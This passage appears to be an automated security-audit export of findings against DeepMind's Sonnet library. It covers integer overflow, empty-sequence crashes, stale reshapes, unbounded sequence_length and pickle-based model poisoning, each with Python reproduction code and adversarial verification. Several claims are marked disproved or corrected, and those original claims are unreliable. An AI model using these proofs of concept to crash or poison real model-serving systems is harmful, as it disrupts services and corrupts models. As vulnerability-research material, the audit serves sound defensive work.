then passes result to `tf.nn.conv_transpose`\n\n## Attacker Control\n\nAttacker controls input tensor spatial dimensions. Stride is set at construction time. The overflow is achievable with moderately large inputs (e.g., H=65536, stride=32768 yields H*stride = 2.1 billion \u003e INT32_MAX).\n\n## Trust Boundary Crossed\n\nLibrary API boundary: caller-supplied tensor dimensions flow through int32 arithmetic without overflow check, producing values that corrupt the output_shape argument to TF kernel ops.\n\n## Impact\n\nDoS -- TF kernel crash when `tf.nn.conv_transpose` receives a negative output shape from the int32 overflow. The crash occurs in the TF C++ kernel layer. However, practical exploitation is constrained by the memory requirement for allocating the large input tensor -- OOM may precede the overflow crash in many configurations.\n\n## Evidence\n\n```python\n# conv_transpose.py:185-206\ndef _get_output_shape(self, inputs):\n    input_shape = inputs.shape if inputs.shape.is_fully_defined() else tf.shape(inputs)  # int32\n    if self._channel_index == 1:\n        input_size = input_shape[2:]\n    else:\n        input_size = input_shape[1:-1]\n    stride = utils.replicate(self._stride, self._num_spatial_dims, \"stride\")\n    output_shape = smart_lambda(lambda x, y: x * y, input_size, stride)  # int32 overflow\n    # ...\n    return output_shape\n```\n\nDeep probe PH-09 confirmed the overflow path. PH-14 confirmed the default path has no validation.\n\n## Reproduction Steps\n\n```python\nimport sonnet as snt\nimport tensorflow as tf\n\n# ConvNDTranspose with large stride\nconv_t = snt.Conv2DTranspose(output_channels=3, kernel_shape=3, stride=32768)\n\n# Dynamic shape input large enough to overflow\n# Note: actual allocation of this tensor may OOM\n@tf.function(input_signature=[tf.TensorSpec([None, None, None, 3])])\ndef run(x):\n    return conv_t(x)\n\n# With H=65536: H*stride = 65536*32768 = 2,147,483,648 \u003e INT32_MAX\nlarge_input = tf.zeros([1, 65536, 1, 3])  # More practical: large H, small W\nrun(large_input)  # int32 overflow -\u003e negative output_shape -\u003e TF crash\n```\n","severity":"medium","confidence":"tentative","tags":["archon","phase-8","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"sonnet/src/conv_transpose.py:185-206","repo_name":"https://github.com/deepmind/sonnet","matched_at":["sonnet/src/conv_transpose.py:185-206","sonnet/src/conv_transpose.py:186","sonnet/src/conv_transpose.py:195","sonnet/src/conv_transpose.py:125-135"],"finding_hash":"1b3c02410c87c0800c273380e68ed09a","found_at":"2026-04-18T18:34:06.13429Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":9,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-023","module_name":"The CPU-specialized LSTM path `_block_unrolled_lstm` (recurrent.py:1052) passes `seq_len_max=0` to the TF raw op `BlockLSTMV2` when the input sequence has zero time steps. After the op returns, `all_h","module_type":"whitebox","finding_source":"archon","module_short":"blocklstm-zero-crash","description":"## Summary\n\nThe CPU-specialized LSTM path `_block_unrolled_lstm` (recurrent.py:1052) passes `seq_len_max=0` to the TF raw op `BlockLSTMV2` when the input sequence has zero time steps. After the op returns, `all_hidden[-1]` raises an `IndexError` on the empty result tensor, crashing the serving process. Unlike the fallback path which calls `_unstack_input_sequence` (which validates for zero steps), the CPU-specialized path bypasses this validation entirely.\n\n## Location\n\n- `sonnet/src/recurrent.py:1052-1067` -- `_block_unrolled_lstm()`\n- `sonnet/src/recurrent.py:1057` -- `seq_len_max=tf.cast(tf.shape(input_sequence)[0], tf.int64)` (zero if time=0)\n- `sonnet/src/recurrent.py:1067` -- `all_hidden[-1]` (IndexError on empty tensor)\n- Validation gap: `_unstack_input_sequence` (line 386) validates but is NOT called by `_block_unrolled_lstm`\n\n## Attacker Control\n\nAPI caller supplies the `input_sequence` tensor. A zero-step sequence (`[0, B, F]`) directly triggers the crash. In serving contexts, this can occur from empty input batches or degenerate sequence lengths.\n\n## Trust Boundary Crossed\n\nLibrary API boundary: caller-supplied tensor shape flows to TF raw op `BlockLSTMV2` and then to Python indexing without validation. The CPU-specialized path trusts the caller to provide non-empty sequences, but this contract is not enforced.\n\n## Impact\n\nProcess crash (DoS) in serving environments. The `IndexError` from `all_hidden[-1]` on an empty tensor is unrecoverable. In multi-tenant serving, this crashes the entire serving process.\n\n## Evidence\n\n```python\n# recurrent.py:1052-1067\ndef _block_unrolled_lstm(input_sequence, initial_state, w_i, w_h, b):\n    w_peephole = tf.zeros(\n        tf.shape(initial_state.hidden)[1:], dtype=initial_state.hidden.dtype)\n    _, all_cell, _, _, _, _, all_hidden = tf.raw_ops.BlockLSTMV2(\n        seq_len_max=tf.cast(tf.shape(input_sequence)[0], tf.int64),  # 0 if empty\n        x=input_sequence,\n        cs_prev=initial_state.cell,\n        h_prev=initial_state.hidden,\n        w=tf.concat([w_i, w_h], axis=0),\n        wci=w_peephole, wcf=w_peephole, wco=w_peephole,\n        b=b, use_peephole=False)\n    return all_hidden, LSTMState(all_hidden[-1], all_cell[-1])  # IndexError\n```\n\nDeep probe PH-08 confirmed this path.\n\n## Reproduction Steps\n\n```python\nimport sonnet as snt\nimport tensorflow as tf\n\nlstm = snt.UnrolledLSTM(hidden_size=64)\nempty_seq = tf.zeros([0, 2, 32])  # Zero time steps\nstate = snt.LSTMState(\n    hidden=tf.zeros([2, 64]),\n    cell=tf.zeros([2, 64]))\n\n# On CPU, this triggers _block_unrolled_lstm\n# which crashes with IndexError on all_hidden[-1]\nlstm(empty_seq, state)\n```\n\n## Cold Verification\n\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: Reproduction succeeded on first attempt -- zero-step input to UnrolledLSTM on CPU causes InvalidArgumentError at all_hidden[-1] (line 1067) due to missing validation that exists in the fallback path.\nSeverity-Final: MEDIUM\nPoC-Status: executed\n\n### Sub-claim Verification\n\n1. **Does _block_unrolled_lstm pass seq_len_max from tf.shape(input_sequence)[0]?**\n   YES -- confirmed at line 1057: `seq_len_max=tf.cast(tf.shape(input_sequence)[0], tf.int64)`. When input has shape [0, B, F], this evaluates to 0.\n\n2. **Does it access all_hidden[-1] which would error on empty?**\n   YES -- confirmed at line 1067: `LSTMState(all_hidden[-1], all_cell[-1])`. When BlockLSTMV2 returns tensors with shape [0, B, H], the [-1] index causes `InvalidArgumentError: slice index -1 of dimension 0 out of bounds`.\n\n3. **Is _unstack_input_sequence (with its zero check) NOT called from this path?**\n   CORRECT -- `_block_unrolled_lstm` directly calls `tf.raw_ops.BlockLSTMV2` without calling `_unstack_input_sequence`. The zero-check at line 411 (`if num_steps == 0: raise ValueError`) only protects `dynamic_unroll`/`static_unroll` callers via `_fallback_unrolled_lstm`.\n\n4. **Is there any other validation preventing zero-step inputs?**\n   NO -- the only validation on the path is `utils.assert_rank(input_sequence, 3)` in `_initialize` (line 965), which checks rank but not dimension sizes. No other guard exists.\n\n### Reproduction Result\n\n- Environment: macOS Darwin 25.3.0, Python 3.9, TensorFlow 2.20.0, dm-sonnet 2.0.3.dev0, CPU-only\n- Error: `InvalidArgumentError: slice index -1 of dimension 0 out of bounds. [Op:StridedSlice] name: unrolled_lstm/strided_slice/`\n- Note: The actual error is `InvalidArgumentError` (TF op-level), not Python `IndexError` as stated in the original finding. The root cause and impact are the same.\n\n### Severity Adjustment\n\nDowngraded from HIGH to MEDIUM. While the crash is real and reproducible, this is a library-level input validation bug. Exploitation requires the downstream application to pass zero-step tensors to the library without its own validation. The crash is a catchable TensorFlow exception (DoS only), with no memory corruption, code execution, or data disclosure.\n","severity":"high","confidence":"tentative","tags":["archon","phase-8","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"sonnet/src/recurrent.py:1052-1067","repo_name":"https://github.com/deepmind/sonnet","matched_at":["sonnet/src/recurrent.py:1052-1067","sonnet/src/recurrent.py:1057","sonnet/src/recurrent.py:1067"],"finding_hash":"98e12fc671500d4dbc11cae0260c5df1","found_at":"2026-04-18T18:34:06.134288Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":8,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-022","module_name":"GroupNorm's `_initialize` method is decorated with `@once`, causing `_inputs_reshape` to be computed from the first call's spatial dimensions and cached permanently. On subsequent calls with different","module_type":"whitebox","finding_source":"archon","module_short":"groupnorm-spatial-fixation","description":"## Summary\n\nGroupNorm's `_initialize` method is decorated with `@once`, causing `_inputs_reshape` to be computed from the first call's spatial dimensions and cached permanently. On subsequent calls with different spatial dimensions (but same rank and total element count), `tf.reshape(inputs, self._inputs_reshape)` succeeds but produces incorrect group factoring, leading to wrong normalization statistics from `tf.nn.moments`. The only guard (rank check at line 166) passes for inputs with the same rank.\n\n## Location\n\n- `sonnet/src/group_norm.py:166-172` -- `GroupNorm.__call__()`: rank check then reshape with stale `_inputs_reshape`\n- `sonnet/src/group_norm.py:~200` -- `GroupNorm._initialize()`: computes `_inputs_reshape` via `@once`\n\n## Attacker Control\n\nAPI caller controls input tensor spatial dimensions. In dynamic-resolution serving (e.g., multi-scale image processing, variable-length feature maps), different requests may produce feature maps with different spatial dimensions but the same rank and channel count.\n\n## Trust Boundary Crossed\n\nLibrary API boundary: caller-supplied tensor spatial dimensions are expected to be validated against the cached reshape shape, but only rank is checked. The implicit contract that spatial dimensions remain fixed is not enforced.\n\n## Impact\n\nSilent output corruption. GroupNorm produces wrong normalization statistics when spatial dimensions change within same rank and same total element count. The output appears valid (same shape, finite values) but normalization is computed over incorrectly grouped elements, leading to systematic bias in downstream layers.\n\n## Evidence\n\n```python\n# group_norm.py:166-172\nif len(inputs.shape) != self._rank:  # Only checks rank, not spatial dims\n    raise ValueError(...)\ninputs = tf.reshape(inputs, self._inputs_reshape)  # Stale from first call\nmean, var = tf.nn.moments(inputs, self._axis, keepdims=True)  # Wrong groups\n```\n\nDeep probe PH-06 validated with example: First `[2,4,4,16]` -\u003e `_inputs_reshape=[-1,4,4,4,4]`. Second `[2,8,2,16]` -\u003e reshape succeeds (512 total elements) but spatial factoring is wrong.\n\n## Reproduction Steps\n\n```python\nimport sonnet as snt\nimport tensorflow as tf\n\ngn = snt.GroupNorm(groups=4)\n\n# First call sets _inputs_reshape\nx1 = tf.random.normal([2, 4, 4, 16])\nout1 = gn(x1)  # _inputs_reshape = [-1, 4, 4, 4, 4]\n\n# Second call with different spatial dims, same total\nx2 = tf.random.normal([2, 8, 2, 16])\nout2 = gn(x2)  # Uses stale reshape -\u003e wrong normalization groups\n# out2 is silently corrupted\n```\n","severity":"medium","confidence":"tentative","tags":["archon","phase-8","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"sonnet/src/group_norm.py:166-172","repo_name":"https://github.com/deepmind/sonnet","matched_at":["sonnet/src/group_norm.py:166-172"],"finding_hash":"c39fb240166c3f3dc8dc0f37085241f3","found_at":"2026-04-18T18:34:06.134284Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":6,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-020","module_name":"When a zero-dimension input tensor (e.g., channel dimension = 0) is passed as the first call to ConvND, DepthwiseConv2D, Linear, or BatchNorm modules, the weight initialization computes `1 / sqrt(np.p","module_type":"whitebox","finding_source":"archon","module_short":"zero-dim-nan-weights","description":"## Summary\n\nWhen a zero-dimension input tensor (e.g., channel dimension = 0) is passed as the first call to ConvND, DepthwiseConv2D, Linear, or BatchNorm modules, the weight initialization computes `1 / sqrt(np.prod(fan_in_shape))` where `np.prod` returns 0, producing `stddev = inf`. The `TruncatedNormal(stddev=inf)` initializer then generates NaN weights. Because `_initialize` is decorated with `@once`, the NaN corruption is permanent for the module's lifetime -- all subsequent inference calls return NaN regardless of input. For BatchNorm with FusedBatchNormV2, zero channels cause a C++ CHECK failure (process crash).\n\n## Location\n\n- `sonnet/src/conv.py:157-158` -- `ConvND._make_w()`: `stddev = 1 / np.sqrt(np.prod(fan_in_shape))`\n- `sonnet/src/depthwise_conv.py:123-125` -- `DepthwiseConv2D._initialize()`: same pattern\n- `sonnet/src/linear.py:69-71` -- `Linear._initialize()`: `stddev = 1 / math.sqrt(self.input_size)`\n- `sonnet/src/batch_norm.py:199` -- `BaseBatchNorm.__call__()`: FusedBatchNormV2 with zero channels\n- Guards bypassed: `conv.py:133` (`if self.input_channels is None`), `linear.py:64` (`if input_size is None`) -- both check None only, not zero\n\n## Attacker Control\n\nAPI caller controls the input tensor shape. In ML serving contexts, input tensors are derived from user-supplied data (images, text, structured data). Zero-dimension tensors can arise from:\n1. Dynamic slicing with attacker-controlled indices producing empty slices\n2. Model configuration files specifying `output_channels=0` or `kernel_shape=0`\n3. Preprocessing pipelines that filter channels based on attacker-influenced criteria\n\n## Trust Boundary Crossed\n\nLibrary API boundary: caller-supplied tensor shape flows through `inputs.shape[channel_index]` into `np.prod(fan_in_shape)` and then `1/sqrt(result)` without any dimension-value validation. The library trusts the caller to provide non-zero dimensions, but this contract is not enforced.\n\n## Impact\n\n- **Silent permanent model corruption**: All weights initialized to NaN via @once fixation. Every subsequent inference call returns NaN.\n- **Persistence**: @once ensures `_initialize` never re-runs, so the module cannot recover without reconstruction.\n- **BatchNorm variant**: Zero-channel input to fused BatchNorm causes C++ CHECK failure (process crash / DoS).\n- **Scope**: Affects ConvND (Conv1D, Conv2D, Conv3D), DepthwiseConv2D, Linear, and BatchNorm -- the most commonly used Sonnet modules.\n\n## Evidence\n\n```python\n# conv.py:150-161\ndef _make_w(self):\n    weight_shape = utils.replicate(self.kernel_shape, self._num_spatial_dims, \"kernel_shape\")\n    weight_shape = weight_shape + (self.input_channels, self.output_channels)\n    if self.w_init is None:\n        fan_in_shape = weight_shape[:-1]  # Contains 0 if input_channels=0\n        stddev = 1 / np.sqrt(np.prod(fan_in_shape))  # 1/sqrt(0) = inf\n        self.w_init = initializers.TruncatedNormal(stddev=stddev)  # NaN weights\n    return tf.Variable(self.w_init(weight_shape, self._dtype), name=\"w\")\n\n# conv.py:132-134 -- Guard checks None only\nself.input_channels = inputs.shape[self._channel_index]\nif self.input_channels is None:  # Does NOT check for 0\n    raise ValueError(\"The number of input channels must be known.\")\n```\n\nDeep probe PH-01 (tensor-processing) confirmed the complete path. Deep probe PH-19 confirmed the BatchNorm FusedBatchNormV2 CHECK-fail variant.\n\n## Reproduction Steps\n\n```python\nimport sonnet as snt\nimport tensorflow as tf\n\n# Conv2D with zero-channel input\nconv = snt.Conv2D(output_channels=32, kernel_shape=3)\nzero_input = tf.zeros([1, 8, 8, 0])  # Zero channels\nconv(zero_input)  # Initializes with NaN weights via @once\n\n# Verify corruption\nnormal_input = tf.random.normal([1, 8, 8, 3])\n# This will fail because @once prevents re-initialization\n# and weights are NaN from the zero-channel init\n\n# Linear with zero-feature input\nlinear = snt.Linear(output_size=64)\nzero_feat = tf.zeros([1, 0])  # Zero features\nlinear(zero_feat)  # stddev=1/sqrt(0)=inf -\u003e NaN weights\n\n# BatchNorm DoS\nbn = snt.BatchNorm(True, True)\nzero_chan = tf.zeros([1, 8, 8, 0])\nbn(zero_chan, is_training=True)  # C++ CHECK fail in FusedBatchNormV2\n```\n\n## Cold Verification\n\n```\nAdversarial-Verdict: DISPROVED\nAdversarial-Rationale: All four claimed effects are factually wrong: ConvND produces zero-element weights (no NaN) with loud InvalidArgumentError (not silent); Linear raises ZeroDivisionError without @once fixation; DepthwiseConv2D fan_in excludes channels (no div-by-zero); BatchNorm succeeds without crash.\nSeverity-Final: LOW\nPoC-Status: executed\n```\n\n### Detailed Findings\n\n**Environment**: macOS Darwin 25.3.0, Python 3.9, TensorFlow 2.20.0, numpy 2.0.2, commit e501ca1\n\n**Claim 1: ConvND produces NaN weights via TruncatedNormal(stddev=inf)** -- DISPROVED\n\nThe `stddev=inf` computation is real (numpy returns inf for `1/np.sqrt(0)` rather than raising an exception). However, the weight shape is `(3, 3, 0, 32)` which has **zero elements**. `tf.random.truncated_normal(shape=(3,3,0,32), stddev=inf)` produces an empty tensor -- there are no NaN values because there are no values at all. The tf.Variable is valid but empty.\n\nFurthermore, `tf.nn.convolution` rejects zero-depth filters with `InvalidArgumentError: \"filter depth must be stricly positive, got 0\"`. The failure is **loud** (exception), not silent.\n\nThe `@once` decorator DOES lock the module permanently (since `_initialize` succeeds), so subsequent calls with normal input also fail with InvalidArgumentError. This is a real robustness bug but NOT silent NaN corruption.\n\n**Claim 2: Linear produces NaN weights** -- DISPROVED\n\nLinear uses `math.sqrt()` (Python stdlib), not `np.sqrt()`. `math.sqrt(0) = 0.0`, and `1/0.0` raises `ZeroDivisionError` in Python. This exception occurs inside `_initialize`, and the `@once` decorator explicitly does not set the \"done\" marker on errors (once.py line 59). The module is NOT permanently corrupted and can be retried with valid input.\n\n**Claim 3: DepthwiseConv2D has the same pattern** -- DISPROVED\n\nDepthwiseConv2D's `fan_in_shape = weight_shape[:2]` (line 123) takes only the first 2 dimensions (spatial kernel dims), NOT the channel dimension. With kernel_shape=3, `fan_in_shape = (3, 3)`, `np.prod = 9`, `stddev = 1/3`. There is no division by zero. The module completes successfully with zero channels.\n\n**Claim 4: BatchNorm with zero channels causes C++ CHECK crash** -- DISPROVED\n\n`tf.raw_ops.FusedBatchNormV2` handles zero-channel input gracefully, returning an output tensor of shape `(1, 8, 8, 0)`. No crash, no CHECK failure, no error of any kind.\n\n### What Actually Exists\n\nConvND has a real but low-severity robustness bug: zero-channel first input causes `@once` to lock in wrong-shape weights, making the module permanently unusable (raises InvalidArgumentError on all subsequent calls). This is an API-misuse/input-validation gap, not a silent corruption vulnerability. The None-only guard at conv.py:133 should also check for zero.\n\n### Full review\n\nSee: `/Users/bytedance/Desktop/oss-to-run/sonnet/archon/adversarial-reviews/zero-dim-nan-weights-review.md`\nSee: `/Users/bytedance/Desktop/oss-to-run/sonnet/archon/real-env-evidence/zero-dim-nan-weights/reproduction.log`\n","severity":"high","confidence":"tentative","tags":["archon","phase-8","false positive (adversarial)","poc-pending"],"status":"open","cvss_score":0,"source_file":"sonnet/src/conv.py:157-158","repo_name":"https://github.com/deepmind/sonnet","matched_at":["sonnet/src/conv.py:157-158","sonnet/src/depthwise_conv.py:123-125","sonnet/src/linear.py:69-71","sonnet/src/batch_norm.py:199"],"finding_hash":"ee9a303c44dec909642f5e38a4b68893","found_at":"2026-04-18T18:34:06.134283Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":7,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-021","module_name":"The `sequence_length` parameter to `dynamic_unroll` and `static_unroll` is used in `_rnn_step` (recurrent.py:450) in the comparison `t \u003e= sequence_length` without any bounds validation. Negative value","module_type":"whitebox","finding_source":"archon","module_short":"sequence-length-bounds","description":"## Summary\n\nThe `sequence_length` parameter to `dynamic_unroll` and `static_unroll` is used in `_rnn_step` (recurrent.py:450) in the comparison `t \u003e= sequence_length` without any bounds validation. Negative values cause the condition to be always True, freezing all outputs at zero (initial state). Values exceeding `num_steps` cause the condition to be always False, disabling masking entirely and processing adversarial padding content. Neither bound is checked anywhere in the call chain.\n\n## Location\n\n- `sonnet/src/recurrent.py:450` -- `maybe_propagate = functools.partial(_safe_where, t \u003e= sequence_length)`\n- `sonnet/src/recurrent.py:295` -- `dynamic_unroll()` accepts `sequence_length` parameter\n- `sonnet/src/recurrent.py:198` -- `static_unroll()` accepts `sequence_length` parameter\n- `sonnet/src/recurrent.py:437` -- `_rnn_step()` uses `sequence_length` without validation\n\n## Attacker Control\n\nAPI caller supplies the `sequence_length` parameter as a tensor to `dynamic_unroll` or `static_unroll`. In NLP serving systems, `sequence_length` may be derived from user input (e.g., text length, number of tokens). Direct control requires the serving API to pass this parameter through.\n\n## Trust Boundary Crossed\n\nLibrary API boundary: caller-supplied integer tensor is used directly in a comparison that controls whether RNN outputs are masked (frozen at previous values) or propagated. No validation enforces the implicit contract that `0 \u003c= sequence_length \u003c= num_steps`.\n\n## Impact\n\nTwo distinct exploitation modes:\n\n1. **Negative sequence_length (output freeze)**: All RNN outputs are frozen at the initial state (zeros). The model ignores all input features. In classification serving, all inputs produce identical class probabilities.\n\n2. **Oversize sequence_length (masking disabled)**: Masking is completely bypassed. Adversarial content in padding positions (typically zeros or adversarial tokens) is processed by the RNN, enabling data injection via padding in sequence models.\n\n## Evidence\n\n```python\n# recurrent.py:437-454\ndef _rnn_step(core, input_tas, sequence_length, t, prev_outputs, prev_state):\n    outputs, state = core(\n        tree.map_structure(lambda i: i.read(t), input_tas), prev_state)\n    if prev_outputs is None:\n        assert t == 0\n        prev_outputs = tree.map_structure(tf.zeros_like, outputs)\n    if sequence_length is not None:\n        # No bounds check on sequence_length\n        maybe_propagate = functools.partial(_safe_where, t \u003e= sequence_length)\n        outputs = tree.map_structure(maybe_propagate, prev_outputs, outputs)\n        state = tree.map_structure(maybe_propagate, prev_state, state)\n    return outputs, state\n```\n\nDeep probe PH-04 confirmed the negative path. Deep probe PH-15 confirmed the oversize path.\n\n## Reproduction Steps\n\n```python\nimport sonnet as snt\nimport tensorflow as tf\n\ncore = snt.LSTM(hidden_size=64)\nseq = tf.random.normal([10, 2, 32])  # 10 steps, batch=2, features=32\nstate = core.initial_state(batch_size=2)\n\n# Attack 1: Negative sequence_length -- freezes all outputs\noutputs_neg, _ = snt.dynamic_unroll(\n    core, seq, state, sequence_length=tf.constant([-1, -1]))\n# All outputs are zero (initial state) regardless of input\n\n# Attack 2: Oversize sequence_length -- disables masking\noutputs_big, _ = snt.dynamic_unroll(\n    core, seq, state, sequence_length=tf.constant([999999, 999999]))\n# Masking disabled: all timesteps processed including padding\n```\n\n## Cold Verification\n\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: Code path trace confirms zero validation on sequence_length from entry to comparison at line 450; negative and oversize values produce the claimed incorrect masking behavior; however severity downgraded due to application-level preconditions required for exploitation.\nSeverity-Final: MEDIUM\nPoC-Status: theoretical\n\n### Verification Details\n\n**Sub-claim verification:**\n\n1. **Does recurrent.py:450 actually use `t \u003e= sequence_length` without bounds checking?** YES. Confirmed at line 450: `maybe_propagate = functools.partial(_safe_where, t \u003e= sequence_length)`. No bounds check exists anywhere in `_rnn_step`.\n\n2. **Is there ANY validation of sequence_length in dynamic_unroll or _rnn_step?** NO. Full search of `recurrent.py` shows `sequence_length` appears 14 times; none perform any range validation, assertion, or clipping. The parameter is passed through from `dynamic_unroll` (line 299) and `static_unroll` (line 202) directly to `_rnn_step` (line 437).\n\n3. **Does negative sequence_length actually cause always-True comparison?** YES. For `t` in range `[0, num_steps-1]` (all non-negative), `t \u003e= negative_value` is always True. This causes `_safe_where` to return `prev_outputs` (frozen state) for every timestep.\n\n4. **Does oversize sequence_length actually disable masking?** YES. For `t` in range `[0, num_steps-1]`, if `sequence_length \u003e num_steps`, then `t \u003e= sequence_length` is always False. This causes `_safe_where` to return `outputs` (new computation) for every timestep, including padding positions.\n\n**Severity downgrade rationale:** The finding is factually correct but the original HIGH rating overstates exploitability. Exploitation requires that a serving application passes user-controlled length values directly to `dynamic_unroll`/`static_unroll` without any application-level validation. Additionally, the lack of bounds checking on `sequence_length` is consistent with TensorFlow ecosystem conventions (e.g., `tf.nn.dynamic_rnn` behaves the same way). Impact is limited to model output manipulation -- no RCE, authentication bypass, or data exfiltration. Downgraded to MEDIUM.\n\nFull review: archon/adversarial-reviews/sequence-length-bounds-review.md\n","severity":"high","confidence":"tentative","tags":["archon","phase-8","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"sonnet/src/recurrent.py:450","repo_name":"https://github.com/deepmind/sonnet","matched_at":["sonnet/src/recurrent.py:450","sonnet/src/recurrent.py:295","sonnet/src/recurrent.py:198","sonnet/src/recurrent.py:437"],"finding_hash":"d1d18f8f7c4f19c97e1de8823c1f9269","found_at":"2026-04-18T18:34:06.134283Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":5,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-002","module_name":"Sonnet's `@once` decorator (`sonnet/src/once.py`) stores a record of which decorated methods have been called in an instance attribute `_snt_once` (a Python `set` of UUID4 values). When a Sonnet modul","module_type":"whitebox","finding_source":"archon","module_short":"once-state-injection-pickle","description":"## Summary\n\nSonnet's `@once` decorator (`sonnet/src/once.py`) stores a record of which decorated methods have been called in an instance attribute `_snt_once` (a Python `set` of UUID4 values). When a Sonnet module is pickled, this set is serialized as part of the instance's `__dict__` with UUIDs in plaintext. An attacker who obtains any legitimate pickle of the target module class can extract the `once_id` UUIDs, then craft a malicious pickle containing:\n\n1. `_snt_once = {uuid1, uuid2, ...}` pre-populated with the extracted UUIDs\n2. Module variables set to adversarially chosen weight values\n\nWhen the victim deserializes this payload, `once.py:88` (`if once_id not in seen`) evaluates to `False` for all decorated methods, permanently skipping `_initialize()`. The module runs with the attacker's weight values for all subsequent inference calls, with no mechanism to detect or recover from the poisoning.\n\nThis is a **distinct attack class from pickle RCE (p8-001)** because:\n- It works even if a `RestrictedUnpickler` blocks `__reduce__` but still allows `__dict__` restoration\n- It enables stealthy model poisoning rather than code execution, which may evade security monitoring\n- The poisoning is permanent -- the `@once` gate never re-fires once `_snt_once` is populated\n\n## Location\n\n- **Primary defect**: `sonnet/src/once.py:83-90` -- `wrapper` function in `once(f)` -- no integrity check on `_snt_once` contents\n- **UUID generation**: `sonnet/src/once.py:70` -- `once_id = uuid.uuid4()` -- one UUID per decorated method\n- **State storage**: `sonnet/src/once.py:86` -- `setattr(instance, _ONCE_PROPERTY, seen)` -- stores set in `__dict__`\n- **Only gate**: `sonnet/src/once.py:88` -- `if once_id not in seen:` -- bypassed by pre-populated set\n- **Pickle persistence confirmed**: `sonnet/src/once_test.py:80,92` -- tests verify @once state survives pickle round-trip\n\n## Attacker Control\n\nFull. The attacker controls:\n1. **The `_snt_once` set contents**: extracted from any legitimate pickle of the same module class using `pickletools.dis()` or direct inspection\n2. **All module variable values**: set to adversarially chosen weights that produce attacker-desired model outputs (backdoor, targeted misclassification, information leakage)\n3. **Which initialization methods are \"already called\"**: by selecting which UUIDs to include in `_snt_once`\n\nThe `once_id` UUIDs are generated at class definition time (not instance creation time), so they are identical across all instances of the same class. Any legitimate pickle of any instance of the target class reveals the UUIDs needed to bypass initialization.\n\n## Trust Boundary Crossed\n\nDeserialization trust boundary: untrusted pickle bytes containing manipulated `_snt_once` state and adversarial weights are loaded into the victim's model, crossing from the attacker's domain (model creation/distribution) to the victim's domain (model inference/serving).\n\nThe attack is particularly effective in:\n- **Model hubs**: where users upload and download pre-trained models\n- **Federated learning**: where participants share model updates\n- **Transfer learning pipelines**: where pre-trained models are fine-tuned\n\n## Impact\n\n- **Model poisoning**: the module produces outputs controlled by the attacker (backdoor triggers, targeted misclassification, adversarial examples)\n- **Permanent corruption**: the `@once` gate prevents re-initialization, making the poisoning persist across all subsequent calls\n- **Stealth**: no exceptions, no warnings, no log messages. The module appears structurally valid (`module.variables` returns variables with expected names and shapes). Only the VALUES are adversarial.\n- **Detection difficulty**: requires comparing weight values against a known-good reference, which is not standard practice in most ML deployment pipelines\n\n## Evidence\n\n1. **Source code -- once.py:88**: `if once_id not in seen:` is the ONLY gate for initialization. Pre-populating `seen` bypasses it permanently.\n2. **Source code -- once.py:70**: `once_id = uuid.uuid4()` generates the UUID at class definition time, making it constant across all instances.\n3. **Source code -- once.py:83-86**: `seen = getattr(instance, _ONCE_PROPERTY, None)` reads directly from `__dict__` with no integrity validation.\n4. **Test confirmation**: `once_test.py:80,92` confirms @once state survives pickle round-trip, proving UUID persistence in pickle stream.\n5. **No integrity check**: grep confirms no HMAC, signature, hash, or validation of `_snt_once` contents anywhere in the codebase.\n6. **Probe validation**: Deep Probe PH-02, PH-C02, PH-C07, CA-09 all validated this attack vector.\n\n## Reproduction Steps\n\n1. Create a legitimate Sonnet module and pickle it:\n```python\nimport pickle, pickletools\nimport sonnet as snt\n\nclass MyModule(snt.Module):\n    @snt.once\n    def _initialize(self, x):\n        self.w = tf.Variable(tf.ones([x.shape[-1], 10]))\n\n    def __call__(self, x):\n        self._initialize(x)\n        return x @ self.w\n\nm = MyModule()\nm(tf.ones([1, 5]))  # triggers _initialize\nlegitimate_pkl = pickle.dumps(m)\n```\n\n2. Extract the `once_id` UUID from the legitimate pickle:\n```python\n# Inspect the pickle stream\npickletools.dis(legitimate_pkl)\n# Look for the _snt_once set containing UUID4 values\n# Or: m2 = pickle.loads(legitimate_pkl); print(m2._snt_once)\n```\n\n3. Craft a malicious pickle with the extracted UUID and poisoned weights:\n```python\nimport uuid\n\nm_evil = MyModule.__new__(MyModule)\nm_evil._snt_once = {extracted_uuid}  # bypass @once\nm_evil.w = tf.Variable(tf.zeros([5, 10]))  # poisoned weights (all zeros)\nevil_pkl = pickle.dumps(m_evil)\n```\n\n4. Victim loads the poisoned pickle:\n```python\nm_loaded = pickle.loads(evil_pkl)\noutput = m_loaded(tf.ones([1, 5]))\n# output is all zeros -- poisoned weights used\n# m_loaded._initialize was NEVER called -- @once gate was bypassed\n```\n\n## Cold Verification\n\nAdversarial-Verdict: DISPROVED\nAdversarial-Rationale: Cross-process reproduction failed because uuid.uuid4() generates different once_id values per process, making extracted UUIDs useless in the victim's environment. The attack only works same-process where attacker already has code execution.\nSeverity-Final: LOW\nPoC-Status: executed\nVerdict: FALSE POSITIVE (adversarial)\n\n### Detailed Findings\n\nThe core claim of this finding -- that an attacker can extract UUIDs from a legitimate pickle and use them to bypass `@once` initialization in the victim's environment -- is incorrect due to a fundamental misunderstanding of UUID 